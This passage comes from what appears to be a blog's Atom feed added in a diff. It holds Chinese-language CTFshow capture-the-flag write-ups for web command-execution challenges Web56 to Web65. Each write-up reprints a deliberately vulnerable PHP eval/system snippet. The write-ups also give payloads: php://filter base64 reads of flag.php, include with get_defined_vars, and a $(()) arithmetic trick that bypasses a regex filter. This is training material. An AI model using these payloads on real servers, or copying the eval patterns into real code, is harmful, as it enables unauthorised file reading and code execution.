class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetcsv</span>(<span class="variable">$a</span>);<span class="title function_ invoke__">var_dump</span>(<span class="variable">$line</span>);&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol type="1"><li><p><code>file_get_contents()</code></p></li><li><p><code>highlight_file()</code></p></li><li><p><code>show_source()</code></p></li><li><p><code>fgets()</code></p></li><li><p><code>readfile()</code></p></li><li><p><code>fopen()</code></p></li><li><p><code>include " "</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">c=<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;1&#x27;</span>]); ?<span class="number">1</span>=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br><span class="line"></span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">get_defined_vars</span>());</span><br><span class="line"><span class="comment">//var_dump:输出注册变量</span></span><br><span class="line"><span class="comment">//get_defined_vars():函数返回由所有已定义变量所组成的数组</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol></li></ul>]]></content>
+    
+    
+    <summary type="html">CTFshow_Web入门_Web62_WP</summary>
+    
+    
+    
+    <category term="CTFshow" scheme="https://auranlu.cc/categories/CTFshow/"/>
+    
+    <category term="web入门" scheme="https://auranlu.cc/categories/CTFshow/web%E5%85%A5%E9%97%A8/"/>
+    
+    <category term="命令执行" scheme="https://auranlu.cc/categories/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Web63</title>
+    <link href="https://auranlu.cc/Auran_Lu/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Web63/"/>
+    <id>https://auranlu.cc/Auran_Lu/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Web63/</id>
+    <published>2025-03-14T16:00:00.000Z</published>
+    <updated>2025-03-24T00:52:50.524Z</updated>
+    
+    <content type="html"><![CDATA[<figure><imgsrc="https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250315155824540.png"alt="image-20250315155824540" /><figcaption aria-hidden="true">image-20250315155824540</figcaption></figure><blockquote><p>[!IMPORTANT]</p></blockquote><h2 id="x01">0x01</h2><p>访问靶场，回显源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: Lazzaro</span><br><span class="line"># @Date:   2020-09-05 20:49:30</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-07 22:02:47</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="x02">0x02</h2><p>与Web58雷同，不再赘述</p>]]></content>
+    
+    
+    <summary type="html">CTFshow_Web入门_Web63_WP</summary>
+    
+    
+    
+    <category term="CTFshow" scheme="https://auranlu.cc/categories/CTFshow/"/>
+    
+    <category term="web入门" scheme="https://auranlu.cc/categories/CTFshow/web%E5%85%A5%E9%97%A8/"/>
+    
+    <category term="命令执行" scheme="https://auranlu.cc/categories/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Web64</title>
+    <link href="https://auranlu.cc/Auran_Lu/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Web64/"/>
+    <id>https://auranlu.cc/Auran_Lu/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Web64/</id>
+    <published>2025-03-14T16:00:00.000Z</published>
+    <updated>2025-03-24T00:52:50.524Z</updated>
+    
+    <content type="html"><![CDATA[<figure><imgsrc="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20250315155840623.png"alt="image-20250315155840623" /><figcaption aria-hidden="true">image-20250315155840623</figcaption></figure><blockquote><p>[!IMPORTANT]</p></blockquote><h2 id="x01">0x01</h2><p>访问靶场，回显源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: Lazzaro</span><br><span class="line"># @Date:   2020-09-05 20:49:30</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-07 22:02:47</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="x02">0x02</h2><p>与Web58雷同，不再赘述</p>]]></content>
+    
+    
+    <summary type="html">CTFshow_Web入门_Web64_WP</summary>
+    
+    
+    
+    <category term="CTFshow" scheme="https://auranlu.cc/categories/CTFshow/"/>
+    
+    <category term="web入门" scheme="https://auranlu.cc/categories/CTFshow/web%E5%85%A5%E9%97%A8/"/>
+    
+    <category term="命令执行" scheme="https://auranlu.cc/categories/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Web65</title>
+    <link href="https://auranlu.cc/Auran_Lu/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Web65/"/>
+    <id>https://auranlu.cc/Auran_Lu/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Web65/</id>
+    <published>2025-03-14T16:00:00.000Z</published>
+    <updated>2025-03-24T00:52:50.524Z</updated>
+    
+    <content type="html"><![CDATA[<figure><imgsrc="https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250315155851124.png"alt="image-20250315155851124" /><figcaption aria-hidden="true">image-20250315155851124</figcaption></figure><blockquote><p>[!IMPORTANT]</p></blockquote><h2 id="x01">0x01</h2><p>访问靶场，回显源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: Lazzaro</span><br><span class="line"># @Date:   2020-09-05 20:49:30</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-07 22:02:47</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="x02">0x02</h2><p>与Web58雷同，不再赘述</p>]]></content>
+    
+    
+    <summary type="html">CTFshow_Web入门_Web65_WP</summary>
+    
+    
+    
+    <category term="CTFshow" scheme="https://auranlu.cc/categories/CTFshow/"/>
+    
+    <category term="web入门" scheme="https://auranlu.cc/categories/CTFshow/web%E5%85%A5%E9%97%A8/"/>
+    
+    <category term="命令执行" scheme="https://auranlu.cc/categories/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Web56</title>
+    <link href="https://auranlu.cc/Auran_Lu/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Web56/"/>
+    <id>https://auranlu.cc/Auran_Lu/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Web56/</id>
+    <published>2025-03-12T16:00:00.000Z</published>
+    <updated>2025-03-24T00:52:50.524Z</updated>
+    
+    <content type="html"><![CDATA[<figure><imgsrc="https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250313151547403.png"alt="image-20250313151547403" /><figcaption aria-hidden="true">image-20250313151547403</figcaption></figure><blockquote><p>[!IMPORTANT]</p><p>linux文件上传,<code>.</code>读取，<code>glob</code>正则</p></blockquote><h2 id="x01">0x01</h2><p>访问靶场，回显源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: Lazzaro</span><br><span class="line"># @Date:   2020-09-05 20:49:30</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-07 22:02:47</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="x02">0x02</h2><blockquote><p>[!NOTe]</p><p>源码审计</p><p>过滤字段新增<code>"" '</code>及<code>[0-9]</code></p></blockquote><p><ahref="..\Web55.md">Web55</a>base64及biz2方法无法使用，使用<code>.</code>读取post传参文件方法不再赘述</p><h2 id="x03">0x03</h2><p>上传payloda获得flag</p>]]></content>
+    
+    
+    <summary type="html">CTFshow_Web入门_Web56_WP</summary>
+    
+    
+    
+    <category term="CTFshow" scheme="https://auranlu.cc/categories/CTFshow/"/>
+    
+    <category term="web入门" scheme="https://auranlu.cc/categories/CTFshow/web%E5%85%A5%E9%97%A8/"/>
+    
+    <category term="命令执行" scheme="https://auranlu.cc/categories/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+    
+    <category term="代码审计" scheme="https://auranlu.cc/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+    <category term="preg_match绕过" scheme="https://auranlu.cc/tags/preg-match%E7%BB%95%E8%BF%87/"/>
+    
+    <category term="文件上传" scheme="https://auranlu.cc/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Web57</title>
+    <link href="https://auranlu.cc/Auran_Lu/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Web57/"/>
+    <id>https://auranlu.cc/Auran_Lu/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Web57/</id>
+    <published>2025-03-12T16:00:00.000Z</published>
+    <updated>2025-03-24T00:52:50.524Z</updated>
+    
+    <content type="html"><![CDATA[<figure><imgsrc="https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250313165824616.png"alt="image-20250313165824616" /><figcaption aria-hidden="true">image-20250313165824616</figcaption></figure><blockquote><p>[!IMPORTANT]</p><p>$(())=0构造</p></blockquote><h2 id="x01">0x01</h2><p>访问靶场，回显源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-05 20:49:30</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-08 01:02:56</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">// 还能炫的动吗？</span><br><span class="line">//flag in 36.php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;, $c))&#123;</span><br><span class="line">        system(&quot;cat &quot;.$c.&quot;.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="x02">0x02</h2><blockquote><p>[!NOTE]</p><p>源码审计</p><p>由注释可得flag位于<code>36.php</code>中</p><p>preg_match过滤字段新增大量通配符,无法模糊匹配</p><p>sytem直接运行<code>cat $c.php</code></p></blockquote><p>构造payload思路:</p><p>linux有<code>(())</code>进行整数运算,内部可以放置表达式，默认相加。</p><p>此时有<code>$(())=0</code> <code>$((~ $(()) ))=-1</code></p><p>35的构造payload如下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure><h2 id="x03">0x03</h2><p>提交payload，获得flag</p><figure><imgsrc="https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250313172416721.png"alt="image-20250313172416721" /><figcaption aria-hidden="true">image-20250313172416721</figcaption></figure>]]></content>
+    
+    
+    <summary type="html">CTFshow_Web入门_Web57_WP</summary>
+    
+    
+    
+    <category term="CTFshow" scheme="https://auranlu.cc/categories/CTFshow/"/>
+    
+    <category term="web入门" scheme="https://auranlu.cc/categories/CTFshow/web%E5%85%A5%E9%97%A8/"/>
+    
+    <category term="命令执行" scheme="https://auranlu.cc/categories/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+    
+    <category term="preg_match绕过" scheme="https://auranlu.cc/tags/preg-match%E7%BB%95%E8%BF%87/"/>
+    
+    <category term="$(())=0构造" scheme="https://auranlu.cc/tags/0%E6%9E%84%E9%80%A0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Web58</title>
+    <link href="https://auranlu.cc/Auran_Lu/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Web58/"/>
+    <id>https://auranlu.cc/Auran_Lu/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Web58/</id>
+    <published>2025-03-12T16:00:00.000Z</published>
+    <updated>2025-03-24T00:52:50.524Z</updated>
+    
+    <content type="html"><![CDATA[<figure><imgsrc="https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250313180540068.png"alt="image-20250313180540068" /><figcaption aria-hidden="true">image-20250313180540068</figcaption></figure><blockquote><p>[!IMPORTANT]</p><p>POST方法修改，system函数禁用绕过</p></blockquote><h2 id="x01">0x01</h2><p>访问靶场，回显源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: Lazzaro</span><br><span class="line"># @Date:   2020-09-05 20:49:30</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-07 22:02:47</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="x02">0x02</h2><blockquote><p>[!NOTE]</p><p>源码审计</p><p>此题使用post传参并执行</p></blockquote><p>构造payload思路：</p><p>猜测此题无过滤，使用post直接传参命令执行</p><h2 id="x03">0x03</h2><figure><imgsrc="https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250313181236803.png"alt="image-20250313181236803" /><figcaption aria-hidden="true">image-20250313181236803</figcaption></figure><p>传参提交后发现此题system命令被禁用</p><p>尝试使用<code>print_r(scandir('./'))</code>查看当前目录(<code>glob()</code>也可使用)</p><figure><imgsrc="https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250313182730382.png"alt="image-20250313182730382" /><figcaption aria-hidden="true">image-20250313182730382</figcaption></figure><p>include函数+伪协议构造payload查看flag.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250313184141171.png" alt="image-20250313184141171"  /></p><p>base64解码后获得flag</p><figure><imgsrc="https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250313184219672.png"alt="image-20250313184219672" /><figcaption aria-hidden="true">image-20250313184219672</figcaption></figure>]]></content>
+    
+    
+    <summary type="html">CTFshow_Web入门_Web58_WP</summary>
+    
+    
+    
+    <category term="CTFshow" scheme="https://auranlu.cc/categories/CTFshow/"/>
+    
+    <category term="web入门" scheme="https://auranlu.cc/categories/CTFshow/web%E5%85%A5%E9%97%A8/"/>
+    
+    <category term="命令执行" scheme="https://auranlu.cc/categories/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Web59</title>
+    <link href="https://auranlu.cc/Auran_Lu/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Web59/"/>
+    <id>https://auranlu.cc/Auran_Lu/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Web59/</id>
+    <published>2025-03-12T16:00:00.000Z</published>
+    <updated>2025-03-24T00:52:50.524Z</updated>
+    
+    <content type="html"><![CDATA[<figure><imgsrc="https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250313184412882.png"alt="image-20250313184412882" /><figcaption aria-hidden="true">image-20250313184412882</figcaption></figure><blockquote><p>[!IMPORTANT]</p><p>POST方法修改，system函数禁用绕过</p></blockquote><h2 id="x01">0x01</h2><p>访问靶场，回显源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: Lazzaro</span><br><span class="line"># @Date:   2020-09-05 20:49:30</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-07 22:02:47</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="x02">0x02</h2><p>审计后猜测与Web58类似</p><h2 id="x03">0x03</h2><p>实际尝试后与Web58雷同，不再赘述</p>]]></content>
+    
+    
+    <summary type="html">CTFshow_Web入门_Web59_WP</summary>
+    
+    
+    
+    <category term="CTFshow" scheme="https://auranlu.cc/categories/CTFshow/"/>
+    
+    <category term="web入门" scheme="https://auranlu.cc/categories/CTFshow/web%E5%85%A5%E9%97%A8/"/>
+    
+    <category term="命令执行" scheme="https://auranlu.cc/categories/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+    
+  </entry>
+  
+</feed>
